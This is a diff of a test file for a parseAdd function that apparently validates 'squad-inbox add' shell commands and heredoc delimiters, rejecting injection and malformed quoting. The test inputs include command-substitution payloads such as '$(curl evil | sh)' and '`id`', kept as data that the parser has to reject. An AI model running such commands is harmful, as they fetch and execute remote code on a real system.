@@ -174,7 +174,7 @@ test('parseAdd: the heredoc operator counts only outside quotes (QAW F1)', () =>
 test('parseAdd: only a quoted delimiter collapses (QAW F2)', () => {
   expect(parseAdd("squad-inbox add --title x <<'EOF'\n$(curl evil | sh)\nEOF")).toEqual({ title: 'x' })
   expect(parseAdd('squad-inbox add --title x <<"EOF"\nbody\nEOF')).toEqual({ title: 'x' })
-  expect(parseAdd('squad-inbox add --title x <<\\EOF\nbody\nEOF')).toEqual({ title: 'x' })
+  expect(parseAdd('squad-inbox add --title x <<\\EOF\nbody\nEOF')).toBeNull()
   expect(parseAdd('squad-inbox add --title x <<EOF\n$(curl evil | sh)\nEOF')).toBeNull()
   expect(parseAdd('squad-inbox add --title x <<EOF\n`id`\nEOF')).toBeNull()
   expect(parseAdd('squad-inbox add --title x <<EOF\nplain\nEOF')).toBeNull()
@@ -191,4 +191,27 @@ test('parseAdd: the first word is pinned (QAW F3)', () => {
 test('parseAdd: the collapsed title is sanitised (QAW F4)', () => {
   expect(parseAdd('squad-inbox add --title $\'a\\x1bb\'')).not.toBeNull()
   expect(parseAdd('squad-inbox add --title "a\u001b[31mb\u202ec"')).toEqual({ title: 'a[31mbc' })
+})
+
+test('parseAdd: the delimiter is the whole shell word (QAW R2-F1)', () => {
+  for (const d of ['<<"E"F', "<<'E'F", "<<'E'\"F\"", '<<"E"$x', '<<\\EF', '<<"E"\\F'])
+    expect(parseAdd(`squad-inbox add --title x ${d}\nEF\nE`)).toBeNull()
+  expect(parseAdd('squad-inbox add --title x <<"reboot"F\nrebootF\nreboot')).toBeNull()
+  expect(parseAdd("squad-inbox add --title x <<'E' \nb\nE")).toEqual({ title: 'x' })
+})
+
+test('parseAdd: only <<\'WORD\' or <<"WORD" closed by an exact line collapses (TL round 2)', () => {
+  const no = [
+    'squad-inbox add --title x <<-\'E\'\nb\nE',
+    "squad-inbox add --title x <<-'E'\nb\n\tE",
+    "squad-inbox add --title x << 'E'\nb\nE",
+    "squad-inbox add --title x <<'E'\nb",
+    "squad-inbox add --title x <<'E'\nb\n\tE",
+    "squad-inbox add --title x <<'E' <<'F'\nb\nE\nF",
+    "squad-inbox add --title x <<'E'>out\nb\nE",
+    "squad-inbox add --title x <<'E'\nb\nE\nls",
+  ]
+  for (const c of no) expect(parseAdd(c)).toBeNull()
+  expect(parseAdd('squad-inbox add --title x <<"E_1"\nb\nE_1')).toEqual({ title: 'x' })
+  expect(parseAdd("squad-inbox add --title x <<'E'\nb\nE\n")).toEqual({ title: 'x' })
 })
